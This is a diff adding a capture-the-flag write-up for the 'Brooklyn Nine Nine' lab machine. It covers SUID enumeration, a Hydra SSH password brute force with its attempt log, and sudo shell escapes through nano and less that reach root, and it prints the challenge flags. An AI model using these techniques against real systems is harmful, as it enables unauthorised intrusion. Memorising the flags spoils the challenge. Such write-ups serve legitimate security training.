@@ -278,3 +278,283 @@ holt@brookly_nine_nine:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
 -rwsr-xr-x 1 root   root            167K Dec  1  2017 /bin/less
 -rwsr-xr-x 1 root   root             43K Jan  8  2020 /bin/mount
 -rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root             27K Jan  8  2020 /bin/umount
+-rwsr-xr-x 1 root   root             40K Oct 10  2019 /snap/core/8268/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/bin/su
+-rwsr-xr-x 1 root   root             27K Oct 10  2019 /snap/core/8268/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8268/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8268/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Oct 11  2019 /snap/core/8268/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd
+-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9066/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9066/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9066/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9066/bin/su
+-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9066/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9066/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9066/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9066/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9066/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9066/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root            109K Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9066/usr/sbin/pppd
+-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+holt@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+holt@brookly_nine_nine:~$ sudo nano /root/root.txt
+
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!
+
+or
+
+https://gtfobins.github.io/gtfobins/nano/
+
+sudo nano
+ctrl +R ctrl + X
+reset; sh 1>&0 2>&0
+```
+```text
+# ls  
+nano.save  user.txt
+```
+```text
+# cat nano.save
+
+bash: line 1:  8199 Hangup                  sh 1>&0 2>&0
+bash: /bin: Is a directory
+```
+```text
+# whoami
+root
+
+another way using hydra
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.249.1 ssh -V -t 64
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-28 18:43:33
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://10.10.249.1:22/
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "654321" - 17 of 14344399 [child 16] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "michael" - 18 of 14344399 [child 17] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "ashley" - 19 of 14344399 [child 18] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "qwerty" - 20 of 14344399 [child 19] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "111111" - 21 of 14344399 [child 20] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "iloveu" - 22 of 14344399 [child 21] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "000000" - 23 of 14344399 [child 22] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "michelle" - 24 of 14344399 [child 23] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "tigger" - 25 of 14344399 [child 24] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sunshine" - 26 of 14344399 [child 25] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "chocolate" - 27 of 14344399 [child 26] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "password1" - 28 of 14344399 [child 27] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "soccer" - 29 of 14344399 [child 28] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "anthony" - 30 of 14344399 [child 29] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "friends" - 31 of 14344399 [child 30] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "butterfly" - 32 of 14344399 [child 31] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "purple" - 33 of 14344399 [child 32] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "angel" - 34 of 14344399 [child 33] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jordan" - 35 of 14344399 [child 34] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "liverpool" - 36 of 14344399 [child 35] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "justin" - 37 of 14344399 [child 36] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "loveme" - 38 of 14344399 [child 37] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "fuckyou" - 39 of 14344399 [child 38] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "123123" - 40 of 14344399 [child 39] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "football" - 41 of 14344399 [child 40] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "secret" - 42 of 14344399 [child 41] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "andrea" - 43 of 14344399 [child 42] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "carlos" - 44 of 14344399 [child 43] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jennifer" - 45 of 14344399 [child 44] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "joshua" - 46 of 14344399 [child 45] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "bubbles" - 47 of 14344399 [child 46] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "1234567890" - 48 of 14344399 [child 47] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "superman" - 49 of 14344399 [child 48] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "hannah" - 50 of 14344399 [child 49] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "amanda" - 51 of 14344399 [child 50] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "loveyou" - 52 of 14344399 [child 51] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "pretty" - 53 of 14344399 [child 52] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "basketball" - 54 of 14344399 [child 53] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "andrew" - 55 of 14344399 [child 54] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "angels" - 56 of 14344399 [child 55] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "tweety" - 57 of 14344399 [child 56] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "flower" - 58 of 14344399 [child 57] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "playboy" - 59 of 14344399 [child 58] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "hello" - 60 of 14344399 [child 59] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "elizabeth" - 61 of 14344399 [child 60] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "hottie" - 62 of 14344399 [child 61] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "tinkerbell" - 63 of 14344399 [child 62] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "charlie" - 64 of 14344399 [child 63] (0/0)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "samantha" - 65 of 14344422 [child 46] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "barbie" - 66 of 14344422 [child 38] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "chelsea" - 67 of 14344422 [child 49] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "lovers" - 68 of 14344422 [child 40] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "teamo" - 69 of 14344422 [child 51] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jasmine" - 70 of 14344422 [child 53] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "brandon" - 71 of 14344422 [child 60] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "666666" - 72 of 14344422 [child 46] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "shadow" - 73 of 14344422 [child 34] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "melissa" - 74 of 14344422 [child 50] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "eminem" - 75 of 14344422 [child 1] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "matthew" - 76 of 14344422 [child 2] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "robert" - 77 of 14344422 [child 11] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "danielle" - 78 of 14344422 [child 10] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "forever" - 79 of 14344422 [child 61] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "family" - 80 of 14344422 [child 37] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jonathan" - 81 of 14344422 [child 0] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "987654321" - 82 of 14344422 [child 27] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "computer" - 83 of 14344422 [child 28] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "whatever" - 84 of 14344422 [child 45] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "dragon" - 85 of 14344422 [child 62] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "vanessa" - 86 of 14344422 [child 4] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "cookie" - 87 of 14344422 [child 38] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "naruto" - 88 of 14344422 [child 42] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "summer" - 89 of 14344422 [child 44] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sweety" - 90 of 14344422 [child 55] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "spongebob" - 91 of 14344422 [child 49] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "joseph" - 92 of 14344422 [child 40] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "junior" - 93 of 14344422 [child 7] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "softball" - 94 of 14344422 [child 12] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "taylor" - 95 of 14344422 [child 16] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "yellow" - 96 of 14344422 [child 25] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "daniela" - 97 of 14344422 [child 3] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "lauren" - 98 of 14344422 [child 9] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "mickey" - 99 of 14344422 [child 13] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "princesa" - 100 of 14344422 [child 19] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "alexandra" - 101 of 14344422 [child 22] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "alexis" - 102 of 14344422 [child 23] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jesus" - 103 of 14344422 [child 26] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "estrella" - 104 of 14344422 [child 30] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "miguel" - 105 of 14344422 [child 41] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "william" - 106 of 14344422 [child 46] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "thomas" - 107 of 14344422 [child 47] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "beautiful" - 108 of 14344422 [child 51] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "mylove" - 109 of 14344422 [child 52] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "angela" - 110 of 14344422 [child 53] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "poohbear" - 111 of 14344422 [child 56] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "patrick" - 112 of 14344422 [child 57] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "iloveme" - 113 of 14344422 [child 60] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sakura" - 114 of 14344422 [child 34] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "adrian" - 115 of 14344422 [child 50] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "alexander" - 116 of 14344422 [child 1] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "destiny" - 117 of 14344422 [child 2] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "christian" - 118 of 14344422 [child 11] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "121212" - 119 of 14344422 [child 61] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sayang" - 120 of 14344422 [child 10] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "america" - 121 of 14344422 [child 37] (0/23)
+[ATTEMPT] target 10.10.249.1 - login "jake" - pass "dancer" - 122 of 14344422 [child 0] (0/23)
+[22][ssh] host: 10.10.249.1   login: jake   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 10 final worker threads did not complete until end.
+[ERROR] 10 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-28 18:43:50
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh jake@10.10.249.1   
+jake@10.10.249.1's password: 
+Last login: Tue May 26 08:56:58 2020
+jake@brookly_nine_nine:~$ whoami
+jake
+jake@brookly_nine_nine:~$ ls
+jake@brookly_nine_nine:~$ cd /home
+jake@brookly_nine_nine:/home$ ls
+amy  holt  jake
+jake@brookly_nine_nine:/home$ find / -type f -name user.txt 2>/dev/null
+/home/holt/user.txt
+jake@brookly_nine_nine:/home$ sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+
+https://gtfobins.github.io/gtfobins/less/
+
+sudo less /etc/profile
+!/bin/sh
+
+jake@brookly_nine_nine:/home$ sudo less /etc/profile
+```
+```text
+# whoami
+root
+```
+```text
+# cat /root/root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!
+
+:)
+```
+User flag
+AHH Jake!
+*ee11cbb19052e40b07aac0ca060c23ee*
+Root flag
+Sudo is a good command
+*63a9f0ea7bb98050796b649e85481845*
+
+## Notes / Lessons Learned
+[[Tony the Tiger]]
+
